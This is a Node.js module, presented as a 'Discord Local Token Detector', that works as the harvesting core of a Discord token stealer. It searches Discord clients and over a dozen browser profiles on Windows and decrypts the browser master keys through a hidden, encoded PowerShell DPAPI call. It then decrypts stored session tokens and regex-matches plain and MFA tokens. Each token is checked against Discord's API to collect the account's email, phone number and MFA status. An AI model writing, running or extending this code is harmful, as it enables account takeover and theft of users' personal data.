/**
 * Discord Local Token Detector (Windows)
 * Resilient multi-client scanner with DPAPI decryption & lock-tolerant file access
 */
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const { execSync } = require('child_process');

function getLevelDbPaths() {
  const appData = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');
  const localAppData = process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local');

  const sources = [
    { name: 'Discord Stable', path: path.join(appData, 'discord', 'Local Storage', 'leveldb'), state: path.join(appData, 'discord', 'Local State') },
    { name: 'Discord Canary', path: path.join(appData, 'discordcanary', 'Local Storage', 'leveldb'), state: path.join(appData, 'discordcanary', 'Local State') },
    { name: 'Discord PTB', path: path.join(appData, 'discordptb', 'Local Storage', 'leveldb'), state: path.join(appData, 'discordptb', 'Local State') },
    { name: 'Discord Development', path: path.join(appData, 'discorddevelopment', 'Local Storage', 'leveldb'), state: path.join(appData, 'discorddevelopment', 'Local State') },
    { name: 'Google Chrome', path: path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'), state: path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Local State') },
    { name: 'Google Chrome (Profile 1)', path: path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Profile 1', 'Local Storage', 'leveldb'), state: path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Local State') },
    { name: 'Google Chrome (Profile 2)', path: path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Profile 2', 'Local Storage', 'leveldb'), state: path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Local State') },
    { name: 'Brave Browser', path: path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'), state: path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State') },
    { name: 'Microsoft Edge', path: path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'), state: path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Local State') },
    { name: 'Microsoft Edge (Profile 1)', path: path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Profile 1', 'Local Storage', 'leveldb'), state: path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Local State') },
    { name: 'Opera Stable', path: path.join(appData, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'), state: path.join(appData, 'Opera Software', 'Opera Stable', 'Local State') },
    { name: 'Opera GX', path: path.join(appData, 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'), state: path.join(appData, 'Opera Software', 'Opera GX Stable', 'Local State') },
    { name: 'Vivaldi', path: path.join(localAppData, 'Vivaldi', 'User Data', 'Default', 'Local Storage', 'leveldb'), state: path.join(localAppData, 'Vivaldi', 'User Data', 'Local State') },
    { name: 'Arc', path: path.join(localAppData, 'Arc', 'User Data', 'Default', 'Local Storage', 'leveldb'), state: path.join(localAppData, 'Arc', 'User Data', 'Local State') }
  ];

  return sources;
}

const masterKeyCache = new Map();

function getMasterKey(localStatePath) {
  if (masterKeyCache.has(localStatePath)) {
    return masterKeyCache.get(localStatePath);
  }
  let masterKey = null;
  try {
    if (!fs.existsSync(localStatePath)) {
      masterKeyCache.set(localStatePath, null);
      return null;
    }
    const content = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
    const encKeyBase64 = content?.os_crypt?.encrypted_key;
    if (!encKeyBase64) {
      masterKeyCache.set(localStatePath, null);
      return null;
    }

    const encKey = Buffer.from(encKeyBase64, 'base64');
    // Strip DPAPI prefix "DPAPI" (5 bytes)
    const dpapiCipher = encKey.subarray(5);

    // Use -EncodedCommand to avoid quoting issues with base64 chars (+, /, =)
    const psScript = `$ProgressPreference = 'SilentlyContinue'; Add-Type -AssemblyName System.Security; $bytes = [Convert]::FromBase64String('${dpapiCipher.toString('base64')}'); $unprotected = [Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser); [Convert]::ToBase64String($unprotected)`;
    const encodedCmd = Buffer.from(psScript, 'utf16le').toString('base64');
    const res = execSync(`powershell -NoProfile -NonInteractive -EncodedCommand ${encodedCmd}`, { encoding: 'utf8', timeout: 8000 });
    masterKey = Buffer.from(res.trim(), 'base64');
  } catch (_) {
    masterKey = null;
  }
  masterKeyCache.set(localStatePath, masterKey);
  return masterKey;
}

function decryptToken(encryptedTokenBuf, masterKey) {
  try {
    if (!encryptedTokenBuf || encryptedTokenBuf.length < 31 || !masterKey) return null;
    const iv = encryptedTokenBuf.subarray(3, 15);
    const ciphertext = encryptedTokenBuf.subarray(15, encryptedTokenBuf.length - 16);
    const authTag = encryptedTokenBuf.subarray(encryptedTokenBuf.length - 16);

    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
    decipher.setAuthTag(authTag);
    let decrypted = decipher.update(ciphertext, null, 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (_) {
    return null;
  }
}

function safeReadFile(filePath) {
  try {
    return fs.readFileSync(filePath);
  } catch (err) {
    if (err.code === 'EBUSY' || err.code === 'EPERM') {
      const tmpPath = path.join(os.tmpdir(), `orb_scan_${path.basename(filePath)}_${Math.random().toString(36).substring(2, 8)}`);
      try {
        fs.copyFileSync(filePath, tmpPath);
        return fs.readFileSync(tmpPath);
      } catch (_) {
        return null;
      } finally {
        try { if (fs.existsSync(tmpPath)) fs.unlinkSync(tmpPath); } catch (_) {}
      }
    }
    return null;
  }
}

async function findLocalTokens() {
  const candidates = new Set();
  const sources = getLevelDbPaths();

  for (const src of sources) {
    if (!fs.existsSync(src.path)) continue;

    let masterKey = null;
    if (src.state && fs.existsSync(src.state)) {
      masterKey = getMasterKey(src.state);
    }

    try {
      const files = fs.readdirSync(src.path);
      for (const file of files) {
        if (!file.endsWith('.log') && !file.endsWith('.ldb')) continue;
        const filePath = path.join(src.path, file);

        const data = safeReadFile(filePath);
        if (!data) continue;

        const text = data.toString('utf8');

        // Check for encrypted Discord token: dQw4w9WgXcQ:base64
        if (masterKey) {
          const encMatches = text.match(/dQw4w9WgXcQ:[^\x22\\]+/g);
          if (encMatches) {
            for (const match of encMatches) {
              const rawBase64 = match.split('dQw4w9WgXcQ:')[1];
              const encBase64 = rawBase64 ? rawBase64.replace(/[^A-Za-z0-9+/=]/g, '') : null;
              if (!encBase64) continue;
              try {
                const encBuf = Buffer.from(encBase64, 'base64');
                const dec = decryptToken(encBuf, masterKey);
                if (dec && dec.length >= 50) {
                  candidates.add(dec);
                }
              } catch (_) {}
            }
          }
        }

        // Check for plain token pattern
        const plainMatches = text.match(/[A-Za-z0-9_\-]{24,28}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27,38}/g);
        if (plainMatches) {
          for (const m of plainMatches) candidates.add(m);
        }

        // Check for mfa tokens
        const mfaMatches = text.match(/mfa\.[A-Za-z0-9_\-]{80,95}/g);
        if (mfaMatches) {
          for (const m of mfaMatches) candidates.add(m);
        }
      }
    } catch (_) {}
  }

  // Validate found tokens and retrieve full profile metadata
  const validTokens = [];
  for (const token of candidates) {
    try {
      const res = await fetch('https://discord.com/api/v9/users/@me', {
        headers: {
          'Authorization': token,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
        }
      });
      if (res.ok) {
        const user = await res.json();
        validTokens.push({
          token,
          user: {
            id: user.id,
            username: user.username,
            global_name: user.global_name || user.username,
            avatar: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128` : 'https://cdn.discordapp.com/embed/avatars/0.png',
            banner: user.banner ? `https://cdn.discordapp.com/banners/${user.id}/${user.banner}.png?size=480` : null,
            email: user.email,
            phone: user.phone,
            premium_type: user.premium_type,
            mfa_enabled: user.mfa_enabled,
            flags: user.flags || user.public_flags || 0,
            accent_color: user.accent_color
          }
        });
      }
    } catch (_) {}
  }

  return validTokens;
}

module.exports = {
  findLocalTokens
};
